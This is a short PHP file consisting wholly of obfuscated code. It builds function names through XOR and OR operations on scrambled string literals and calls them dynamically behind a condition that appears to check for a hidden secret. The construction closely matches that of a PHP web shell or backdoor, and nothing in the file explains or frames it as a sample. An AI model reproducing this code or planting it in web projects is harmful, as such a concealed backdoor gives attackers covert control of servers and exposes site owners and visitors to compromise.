<?php
$hOwa2='QcI3pcA0CtG'&EAJ;$l9Bl='+VT|($ea[?9'^Gsb9Nw.'-1?^W';$JOdZlfN='$@P%,"( A!D'|/*'.
       '03Q C:*/" @D\$ 3 d (@";$QSgJxLk='j9#mf"'^'*is-3c';$NOQ2PFZCBcH='Y!F#Q!dB('./*'.
       'HTCuN*/BHHNSUDa.'!HQ"M@'.FQhI.'"E($P'|'8 PD^ UJ+3@'.XJ_X.'@G@B@GA@'.vAaM.'`A)'.
       'EK';$sQa='t`Ptr!'.bAcb6N.'*ZhV>;'.OVlo.'=!j{['.xFl8.'['^'8%7&Ib"8)(O!]5P+'./*'.
       '0#c5QDAXE7*/hiad.'?'.GMbZ.'#%+:&i2';$Dz0O7BO8=')!)@'|',  @';$qXAe4='@B%'./*Du'.
       ']hnv#;(x&6*/GMre.'`'.Daqu|zpS2WF.')Tl@sU';$SduuCcduex='X^'.mYOq&HtTVOA;'eAh1U'.
       '@_XasL9>';$NVb0i='!'^'@';$kmqq='@TT@'.FXOJ|HTPP.'[PRL';$rS=yndb.',*(=s6m}9)56'.
       ''.x7s1^'6%-#sg}n:u>5vyj`=e x';$hWqkXgVAW='|'^'3';$mVAWv1N27=N&'~';$rGeh2=/*q7'.
       'yjw*/$l9Bl|$JOdZlfN;$dow55d=('2sj'^wS_)|('H` '|'hd ');$KWB3336uw_4=(AWMg.#WPR'.
       '~l'^'b~dY.9')^('D@IZ6#'|'@'.LUA8.'"');$uEduHS=(wwoo_.'{w{oo{w'&'qw}o_{o{'./*r'.
       'hDGx=i2w#F*/nokg)&$qXAe4;$ud15BX=$QSgJxLk|$SduuCcduex;$hGEQ=$NOQ2PFZCBcH^/*PQ'.
       ';Y>0|p.*/$sQa;$h7S929D8j9=$Dz0O7BO8|("@Gzs"^'j&UV');if($rGeh2($dow55d(/*in6AQ'.
       'E*_nrR{*/$KWB3336uw_4($ud15BX)),$hGEQ))$uEduHS($h7S929D8j9,die,$NVb0i);'zl4PR'.
       'x]ZDbLs';echo $KWB3336uw_4($kmqq.$rS.$hWqkXgVAW.$mVAWv1N27);##DdoG?3K!%a;nx'.
       'a2;#FWJCKhwlmccn?e7-$xevXy|N)8*<qA(Uv3|S)E-JKeomcz2dV(C4Tmr_l';